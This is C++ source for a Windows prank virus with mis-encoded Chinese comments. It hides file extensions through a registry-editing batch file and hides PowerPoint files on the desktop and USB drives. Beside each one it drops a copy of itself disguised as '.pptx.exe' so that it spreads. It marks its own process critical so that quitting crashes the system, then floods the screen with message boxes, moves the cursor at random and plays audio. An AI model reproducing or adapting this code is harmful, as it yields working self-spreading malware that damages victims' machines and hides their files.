#include<Windows.h>
#include<shlobj.h>		// ���� SHGetSpecialFolderPath
#include<fstream>
#include<thread>
#include<regex>			//������ʽ
//#include<io.h>
#include "main.h"
#include "resource.h"
#pragma comment(lib, "shell32.lib")	// ���� SHGetSpecialFolderPath
#pragma comment(lib, "Winmm.lib")	// ���� Windows Multimedia API

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR ipCmdLine, int nCmdShow) 
{
	Crash();
	Infect();
	FuckStart();
	return EXIT_SUCCESS;
}

void Infect()
{
	char LocalPath[MAX_PATH] = { "\0" };
	char LocalDisk[4] = { "\0" };

	Hide_File_Ext();

	GetModuleFileName(NULL, LocalPath, MAX_PATH);
	strncpy_s(LocalDisk, LocalPath, 3);
	if (GetDriveType(LocalDisk) == DRIVE_FIXED)
	{
		Infect_U();
		Infect_Computer();
	}
	else if(GetDriveType(LocalDisk) == DRIVE_REMOVABLE)
		Infect_Computer();
	return;
}

void Infect_U()
{
	vector<string>FileList;
	string U_Path;
	Get_U_Disk(U_Path);				//��ȡU���̷�
	if (U_Path.empty())
		return;
	FileSearch(U_Path, FileList);	//����U�̸�Ŀ¼����Ŀ¼
	if(FileList.empty())
		return;
	Sleep(50);
	for (string& file : FileList)	//��Ⱦ
		Infect_File(file);
}

void Infect_Computer()
{
	char TablePath[MAX_PATH] = { "\0" };
	vector<string>FileList;
	SHGetSpecialFolderPath(NULL, TablePath, CSIDL_DESKTOPDIRECTORY, NULL);
	FileSearch(TablePath, FileList);
	if (FileList.empty())
		return;
	Sleep(50);
	for (string file : FileList)
		Infect_File(file);
}

void Infect_File(string& file)
{
	string CopyPath = file + ".exe";						//Ŀ��·��
	char LocalPath[MAX_PATH] = { "\0" };
	SetFileAttributes(file.c_str(), FILE_ATTRIBUTE_HIDDEN);	//�����ļ�
	GetModuleFileName(NULL, LocalPath, MAX_PATH);			//��ȡ����·��
	CopyFile(LocalPath, CopyPath.c_str(), FALSE);			//COPY
	Sleep(20);
	return;
}

void Hide_File_Ext()
{
	char TempPath[MAX_PATH];
	GetTempPath(MAX_PATH, TempPath);
	string Path = TempPath;
	ofstream HideBat(Path + "hide.bat", ios::trunc);
	HideBat << "echo off" << endl
		<< "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"HideFileExt\" /t REG_DWORD /d 1 /f";
	HideBat.close();
	ofstream BatStart(Path + "start.bat", ios::trunc);
	BatStart << "echo off" << endl
		<< Path + "hide.bat";
	BatStart.close();

	system(Path.append("start.bat").c_str());
}

void Get_U_Disk(string& U_Path)
{
	DWORD AllDisk = GetLogicalDrives();	//����һ��32λ����������ת���ɶ����ƺ󣬱�ʾ����,���λΪA��
	if (AllDisk == 0)
		return;
	for (int i = 0; i < 11; i++)		//�ٶ������10������
	{
		if ((AllDisk & 1) == 1)
		{
			U_Path = ('C' + i);
			U_Path += ":\\";
			if (GetDriveType(U_Path.c_str()) == DRIVE_REMOVABLE)	//�ж��Ƿ����ƶ�����
				return;
		}
		AllDisk = AllDisk >> 1;			//��һ���̷�
	}
	if ((AllDisk & 1) != 1)
		return;
}

void FileSearch(string DirPath, vector<string>& FileList)
{
	regex PPTX_File("(.*)(.pptx)");	// *.pptx 

	if (!exists(DirPath))			//���Ŀ¼�Ƿ����
		return;
	
	for (auto& DirectoryIter : recursive_directory_iterator(DirPath))	//������·��Ŀ¼����Ŀ¼
	{
		string file;
		if (regex_match(DirectoryIter.path().filename().string(), PPTX_File))
			FileList.push_back(file.assign(DirectoryIter.path().string()));
	}
	return;
}

/*		����<io.h>,����<filesystem> std::experimental::filesystem���	*
void FileSearch(string DirPath, vector<string>& FileList)
{
	string pathName, temp;
	intptr_t hFile = 0;
	struct _finddata_t fileInfo;

	if ((hFile = _findfirst(pathName.assign(DirPath).
		append("\\*").c_str(), &fileInfo)) == -1)
		return;
	do 
	{
		if (fileInfo.attrib&_A_SUBDIR) {
			string fname = fileInfo.name;
			if (fname != ".." && fname != ".") {
				FileSearch(DirPath + "\\" + fname, FileList);
			}
		}
		else {
			if (strstr(fileInfo.name, ".pptx") && !strstr(fileInfo.name, ".exe"))
				FileList.push_back(temp.assign(DirPath).append("\\").append(fileInfo.name));
		}
	} while (_findnext(hFile, &fileInfo) == 0);

	_findclose(hFile);
	return;
}*/

Crashed::~Crashed()
{
	Crash();
}

void Crash()
{
	typedef NTSTATUS(WINAPI *RtlSetProcessIsCritical) (BOOLEAN, PBOOLEAN, BOOLEAN);
	typedef BOOL(WINAPI *RtlAdjustPrivilege) (ULONG, BOOL, BOOL, PBOOLEAN);
	RtlAdjustPrivilege AdjustPrivilege;
	RtlSetProcessIsCritical SetCriticalProcess;
	// ���� ntdll �Լ���� API
	HANDLE ntdll = LoadLibrary(TEXT("ntdll.dll"));
	AdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress((HINSTANCE)ntdll, "RtlAdjustPrivilege");
	SetCriticalProcess = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
	BOOLEAN b;
	// ���������� Debug Ȩ�ޣ���Ҫ UAC ����Ա���
	AdjustPrivilege(20UL, TRUE, FALSE, &b);
	// ����Ϊ Critical Process
	SetCriticalProcess(TRUE, NULL, FALSE);
	// �˳������� CRITICAL_PROCESS_DIED ����
	return;
} 

void FuckStart()
{
	thread BGM_thread([]() {
		BGM_Player();
	});
	BGM_thread.detach();

	thread ask_1([&]() { 
		MessageBox(NULL, "ɵ����ҵ�����跳�ˣ�", "Fuck homework", MB_OK | MB_ICONEXCLAMATION); });
	ask_1.detach();
	Sleep(3000);

	thread ask_2([&]() {
		MessageBox(NULL, "���������������ɣ�", "Fuck homework", MB_OK | MB_ICONERROR); });
	ask_2.detach();
	Sleep(3000);

	thread fuck_1([]() {
		vector<thread>message_thread;
		while (true)
		{
			message_thread.push_back(
				thread([&]() {
					MessageBox(NULL,
						"��������ҵȥ���ɣ�\nɵ��Ӧ�Խ����Ҳ����裡\n����ѧУˮ������Ǯ��\n������ˮ�����٣�\n������Ǯװ��ô������ͷ\n�ҾͲ�������ûǮ��ˮ����",
						"Fuck homework", MB_OK | MB_ICONERROR);
				})
			);
			Sleep(50);
		}
	});
	thread fuck_2([]() {
		srand((unsigned)time(NULL));
		while (true){
			SetCursorPos(rand() % 1080
				, rand() % 900);
			Sleep(25);
		}
	});
	/*thread fuck_3([]() {
		while (true){
			Sleep(5000);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			Sleep(1500);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
		}
	});*/
	fuck_1.detach();
	fuck_2.detach();
	//fuck_3.detach();
	Sleep(15000);
	return;
}

void BGM_Player()
{
	char tmpmp3[MAX_PATH];
	GetTempPath(MAX_PATH, tmpmp3);
	strcat_s(tmpmp3, "cyka_blyat.mp3");

	if (!ExtractResource(tmpmp3, "MP3", MAKEINTRESOURCE(IDR_MP31)))
		return;

	//���ļ�
	string mcicmd;
	mcicmd.assign("open ").append(tmpmp3).append(" alias mymusic");
	mciSendString(mcicmd.c_str(), NULL, 0, NULL);
	// ��������
	mciSendString("play mymusic wait", NULL, 0, NULL);
	return;
}

bool ExtractResource(char* strDstFile, char* strResType, char* strResName)
{
	// �����ļ�
	HANDLE hFile = CreateFile(strDstFile, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return false;

	// ������Դ�ļ��С�������Դ���ڴ桢�õ���Դ��С
	HRSRC    hRes = FindResource(NULL, strResName, strResType);
	HGLOBAL  hMem = LoadResource(NULL, hRes);
	DWORD    dwSize = SizeofResource(NULL, hRes);

	// д���ļ�
	DWORD dwWrite = 0; // ����д���ֽ�
	WriteFile(hFile, hMem, dwSize, &dwWrite, NULL);
	CloseHandle(hFile);

	return true;
}